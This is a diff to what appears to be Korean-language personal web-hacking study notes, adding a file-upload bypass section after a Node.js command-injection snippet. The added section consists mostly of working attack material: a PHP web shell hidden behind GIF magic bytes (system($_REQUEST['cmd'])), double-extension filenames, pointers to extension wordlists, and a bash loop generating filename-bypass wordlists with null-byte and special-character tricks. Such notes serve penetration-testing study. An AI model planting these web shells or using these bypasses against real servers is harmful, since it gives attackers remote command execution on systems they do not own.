@@ -622,3 +622,30 @@ process.mainModule.require('child_process').execSync('ls -la')
 - 비동기 함수(`exec`, `spawn` 등)는 결과를 즉시 반환하지 않아 공격에 부적합
 
 ---
+# File Upload
+- front에서 파일타입만 확인하는 경우 파일 이름과 내용을 바꿔서 서버로 전송(image.jpg -> ex.php)
+- html 수정
+<img width="1942" height="455" alt="image" src="https://github.com/user-attachments/assets/5be7d857-603b-4260-9a90-facf245bde4f" />
+- `/usr/share/seclists/Discovery/Web-Content/web-extensions.txt`
+- `shell.jpg.php`
+- `shell.php.jpg`
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
+- `/usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt`
+```php
+GIF89a;
+<?php system($_REQUEST['cmd']); ?>
+```
+```php
+GIF87a;
+<?php system($_REQUEST['cmd']); ?>
+```
+```bash
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+    for ext in '.php' '.phps'; do
+        echo "shell$char$ext.jpg" >> wordlist.txt
+        echo "shell$ext$char.jpg" >> wordlist.txt
+        echo "shell.jpg$char$ext" >> wordlist.txt
+        echo "shell.jpg$ext$char" >> wordlist.txt
+    done
+done
+```
